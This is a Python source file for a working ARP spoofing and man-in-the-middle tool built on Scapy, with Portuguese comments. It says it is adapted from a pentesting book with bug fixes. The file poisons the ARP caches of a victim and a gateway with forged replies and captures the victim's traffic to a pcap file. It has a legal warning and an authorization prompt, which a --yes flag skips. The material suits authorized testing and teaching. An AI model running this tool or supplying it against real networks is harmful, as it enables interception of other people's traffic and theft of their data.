#!/usr/bin/env python3
"""
arper.py - Ferramenta educacional de ARP Spoofing / Cache Poisoning.

Baseado no Capitulo 4 do livro "Python para Pentester", com correcoes de
bugs e melhorias de usabilidade/robustez para uso por analistas de
seguranca e pentesters em ambientes de teste AUTORIZADOS.

AVISO LEGAL: use esta ferramenta apenas em redes e dispositivos para os
quais voce tem autorizacao explicita para realizar testes de seguranca.
Veja o README.md para detalhes.
"""

import argparse
import ipaddress
import logging
import os
import signal
import sys
from multiprocessing import Event, Process, set_start_method

from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap

LOGGER = logging.getLogger("arper")


# NOVO: funcao de validacao usada pelo argparse (parametro type=).
# no script original, um IP digitado errado so falhava la na frente,
# dentro do get_mac() ou do Scapy, com uma mensagem de erro confusa. Validar
# aqui faz o argparse recusar a entrada na hora, com uma mensagem clara.
def validar_ip(valor: str) -> str:
    """Valida se a string recebida e um endereco IPv4 valido (uso com argparse)."""
    try:
        ipaddress.IPv4Address(valor)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"'{valor}' nao e um endereco IPv4 valido") from exc
    return valor


# Funcao necessaria para pegar o MAC do alvo e do Gateway
# ALTERADO: timeout/retry viraram parametros (antes eram fixos no corpo da
# funcao) so para facilitar reuso/testes futuros; o comportamento padrao
# continua o mesmo do script original.
def get_mac(target_ip: str, iface: str, timeout: int = 2, retry: int = 10):
    pacote = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(pacote, timeout=timeout, retry=retry, iface=iface, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


# Cria uma classe chamada Arper para criar e gerenciar os pacotes ARP
class Arper:
    def __init__(self, victim: str, gateway: str, interface: str, interval: float = 2.0):
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.interval = interval
        # NOVO: self.stop_event substitui o "try/except KeyboardInterrupt"
        # espalhado pelos metodos (poison/sniff) do script original. Com ele,
        # apenas o processo PAI trata o Ctrl+C (ver run()) e os processos
        # filhos so verificam este evento compartilhado para saber quando
        # parar. Isso evita os tracebacks que tivemos quando o KeyboardInterrupt
        # chegava em um ponto do codigo filho que nao estava protegido
        # (ex.: durante o time.sleep()).
        self.stop_event = Event()

        conf.iface = interface
        conf.verb = 0

        LOGGER.info("Inicializando na interface: %s", interface)

        self.victim_mac = get_mac(victim, interface)
        self.gateway_mac = get_mac(gateway, interface)

        # NOVO: no script original, se get_mac() retornasse None (vitima ou
        # gateway fora do ar, por exemplo), o erro so aparecia bem mais tarde
        # e de forma confusa (ex.: ARP com hwdst=None). Aqui a ferramenta para
        # imediatamente com uma mensagem clara.
        if not self.victim_mac:
            LOGGER.error("Nao foi possivel resolver o MAC da vitima (%s). Ela esta online?", victim)
            sys.exit(1)
        if not self.gateway_mac:
            LOGGER.error("Nao foi possivel resolver o MAC do gateway (%s). Ele esta online?", gateway)
            sys.exit(1)

        LOGGER.info("MAC do Gateway: %s", self.gateway_mac)
        LOGGER.info("MAC da Vitima: %s", self.victim_mac)

    # NOVO: extrai a montagem dos pacotes de poison() para um metodo proprio.
    # Evita duplicar a logica de montagem caso ela precise ser usada
    # em mais de um lugar no futuro, e deixa poison() mais curto e focado
    # so no loop de envio.
    def _montar_pacotes_poison(self):
        poison_victim = Ether(dst=self.victim_mac) / ARP(
            op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac
        )
        poison_gateway = Ether(dst=self.gateway_mac) / ARP(
            op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac
        )
        return poison_victim, poison_gateway

    # Funcao para realizar o envenenamento do cache ARP do alvo e do gateway
    # ALTERADO: antes usava send() (camada 3) e o loop so capturava
    # KeyboardInterrupt ao redor do sendp(), deixando o time.sleep() exposto.
    def poison(self):
        # NOVO: ignora o Ctrl+C neste processo filho de proposito. Quem decide
        # quando parar e so o processo pai (self.stop_event, setado em run()).
        # Sem isso, o SIGINT chegava aqui tambem (mesmo grupo de processos do
        # terminal) e podia interromper o time.sleep() sem ser capturado,
        # gerando o traceback "KeyboardInterrupt".
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        poison_victim, poison_gateway = self._montar_pacotes_poison()

        LOGGER.debug(poison_victim.summary())
        LOGGER.debug(poison_gateway.summary())
        LOGGER.info("Iniciando o ARP Poison. [CTRL-C to stop]")

        # ALTERADO: o loop agora roda ate self.stop_event ser setado pelo pai,
        # em vez de "while True" + try/except local. sendp() (camada 2) com
        # Ether(dst=mac) no pacote substitui o send() original, que gerava o
        # warning "You should be providing the Ethernet destination MAC...".
        while not self.stop_event.is_set():
            try:
                sendp(poison_victim, iface=self.interface, verbose=False)
                sendp(poison_gateway, iface=self.interface, verbose=False)
                sys.stdout.write(".")
                sys.stdout.flush()
            except OSError as exc:
                # NOVO: captura falhas de envio (ex.: interface caiu) sem
                # derrubar o processo inteiro.
                LOGGER.warning("Falha ao enviar pacote ARP: %s", exc)
            # NOVO: Event.wait() funciona como um time.sleep(), mas retorna
            # na hora se o stop_event for setado durante a espera — por isso
            # o encerramento fica quase instantaneo, em vez de esperar os 2s
            # do sleep original.
            self.stop_event.wait(self.interval)

    # Funcao para criar o sniffer de rede
    # ALTERADO: a versao original chamava sniff(count=100, ...) de uma vez so
    # e dependia do tratamento interno do Scapy para o KeyboardInterrupt.
    def sniff(self, count: int, output_file: str):
        # NOVO: mesmo motivo do poison() acima — so o processo pai decide
        # quando parar via stop_event.
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        self.stop_event.wait(5)
        if self.stop_event.is_set():
            return

        LOGGER.info("Sniffando ate %d pacotes...", count)
        bpf_filter = f"host {self.victim}"
        capturados = []
        restante = count
        # NOVO: em vez de UMA chamada sniff(count=100) que pode bloquear
        # indefinidamente se nao houver trafego batendo com o filtro, o
        # sniff() e chamado varias vezes em lotes pequenos (timeout=2s cada).
        # Isso permite checar self.stop_event a cada poucos segundos e
        # encerrar de forma limpa o processo mesmo sem nenhum pacote chegando.
        while restante > 0 and not self.stop_event.is_set():
            lote = sniff(
                count=min(restante, 10), filter=bpf_filter, iface=self.interface, timeout=2
            )
            capturados.extend(lote)
            restante -= len(lote)

        if capturados:
            wrpcap(output_file, capturados)  # Cria um arquivo pcap da captura feita na rede.
            LOGGER.info("Pacotes capturados salvos em %s", output_file)
        else:
            # NOVO: antes, se nada fosse capturado, o wrpcap() ainda rodava
            # (gerando um .pcap vazio/erro); agora so salva se houver pacotes.
            LOGGER.info("Nenhum pacote capturado antes do encerramento.")

    # Funcao para restaurar a tabela ARP da vitima e do gateway apos finalizar o ataque
    # ALTERADO: usava send(ARP(..., hwdst='ff:ff:ff:ff:ff:ff')) (broadcast em
    # L2 "por acidente", via camada 3). Agora usa sendp() com Ether(dst=mac)
    # explicito para cada lado, pelo mesmo motivo do poison(): maior garantia
    # de que o frame chega direcionado, sem depender do Scapy "adivinhar" o
    # destino Ethernet.
    def restore(self):
        LOGGER.info("Restaurando a tabela ARP original...")
        restore_gateway = Ether(dst=self.victim_mac) / ARP(
            op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.victim, hwdst=self.victim_mac
        )
        restore_victim = Ether(dst=self.gateway_mac) / ARP(
            op=2, psrc=self.victim, hwsrc=self.victim_mac, pdst=self.gateway, hwdst=self.gateway_mac
        )
        sendp(restore_gateway, iface=self.interface, count=5, verbose=False)
        sendp(restore_victim, iface=self.interface, count=5, verbose=False)

    # ALTERADO: no script original, run() so dava start() nos dois processos
    # e retornava na hora, sem join(). Isso deixava o join() implicito do
    # atexit do multiprocessing cuidar do encerramento sem nenhuma protecao
    # contra o KeyboardInterrupt, causando o erro "Exception ignored in
    # atexit callback" que vimos ao testar.
    def run(self, sniff_count: int, output_file: str, do_sniff: bool):
        poison_proc = Process(target=self.poison, name="poison")
        poison_proc.start()

        sniff_proc = None
        if do_sniff:
            sniff_proc = Process(target=self.sniff, args=(sniff_count, output_file), name="sniff")
            sniff_proc.start()

        # NOVO: unico ponto do script que realmente trata o Ctrl+C. Em vez de
        # deixar o Python levantar KeyboardInterrupt (comportamento padrao),
        # este handler so marca self.stop_event — os processos filhos (que
        # ignoram SIGINT, ver poison()/sniff()) percebem essa marcacao e
        # encerram sozinhos, de forma limpa.
        def _tratar_sigint(_sig, _frame):
            print()
            LOGGER.info("Interrupcao recebida, encerrando com seguranca...")
            self.stop_event.set()

        signal.signal(signal.SIGINT, _tratar_sigint)

        # NOVO: join() explicito e protegido. O processo principal fica
        # bloqueado aqui esperando os filhos terminarem; se o SIGINT chegar
        # durante essa espera, o handler acima e chamado e o join() apenas
        # continua aguardando (sem lanca a excecao), ate os filhos perceberem
        # o stop_event e encerrarem por conta propria.
        try:
            poison_proc.join()
            if sniff_proc:
                sniff_proc.join()
        finally:
            # NOVO: restore() agora e chamado uma unica vez aqui no processo
            # pai (antes era chamado tanto dentro do poison() quanto do
            # sniff(), duplicando o envio dos pacotes de restauracao).
            self.restore()
            LOGGER.info("Pronto!")


# NOVO: funcao inexistente no script original. 
# Confirmacao de autorizacao antes de qualquer ataque comeca —
# tanto por responsabilidade etica/legal quanto para evitar execucao
# acidental contra o alvo errado. Pode ser pulada com --yes em automacao.
def confirmar_autorizacao() -> None:
    aviso = (
        "\n" + "=" * 70 + "\n"
        "AVISO LEGAL\n"
        "Esta ferramenta realiza ARP Spoofing e deve ser usada APENAS em\n"
        "redes e dispositivos para os quais voce tem autorizacao explicita\n"
        "para realizar testes de seguranca. O uso nao autorizado pode\n"
        "configurar crime. O autor nao se responsabiliza por uso indevido.\n"
        + "=" * 70
    )
    print(aviso)
    resposta = input("Voce possui autorizacao para atacar este alvo? [s/N] ").strip().lower()
    if resposta not in ("s", "sim", "y", "yes"):
        print("Operacao cancelada.")
        sys.exit(1)


# Executa o programa e passa os argumentos
# ALTERADO: antes os 3 argumentos (vitima, gateway, interface) eram lidos
# direto de sys.argv, sem validacao nem --help. Agora usa argparse.
def main():
    # NOVO/ALTERADO: forca explicitamente o metodo 'fork' de criacao de
    # processos. Necessario a partir do Python 3.14, que mudou o padrao no
    # Linux para 'forkserver' — esse novo padrao exige serializar (pickle) o
    # alvo do Process, e como os metodos self.poison/self.sniff carregam a
    # instancia inteira da classe, isso gerava o erro
    # "TypeError: cannot pickle 'weakref.ReferenceType' object".
    set_start_method("fork")
    parser = argparse.ArgumentParser(
        description="Ferramenta educacional de ARP Poisoning (Man-in-the-Middle)."
    )
    parser.add_argument("victim", type=validar_ip, help="IP da vitima")
    parser.add_argument("gateway", type=validar_ip, help="IP do gateway/roteador")
    parser.add_argument("interface", help="Interface de rede a ser usada (ex.: eth0)")
    parser.add_argument("--interval", type=float, default=2.0, help="Intervalo entre envios em segundos (padrao: 2.0)")
    parser.add_argument("--sniff-count", type=int, default=100, help="Numero de pacotes a capturar (padrao: 100)")
    parser.add_argument("--output", default="arper.pcap", help="Arquivo .pcap de saida (padrao: arper.pcap)")
    parser.add_argument("--no-sniff", action="store_true", help="Desativa a captura de pacotes, apenas envenena")
    parser.add_argument("--yes", "-y", action="store_true", help="Pula a confirmacao de autorizacao (uso em automacao)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Exibe logs detalhados (DEBUG)")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    # NOVO: antes, rodar sem sudo so falhava mais tarde, dentro do Scapy,
    # com um erro de permissao menos obvio (ex.: "Operation not permitted"
    # ao abrir o socket raw). Checar aqui da um erro claro e imediato.
    if os.geteuid() != 0:
        LOGGER.error("Este script precisa ser executado como root (sudo).")
        sys.exit(1)

    if not args.yes:
        confirmar_autorizacao()

    arper = Arper(args.victim, args.gateway, args.interface, interval=args.interval)
    arper.run(sniff_count=args.sniff_count, output_file=args.output, do_sniff=not args.no_sniff)

# Executa o programa
if __name__ == "__main__":
    main()
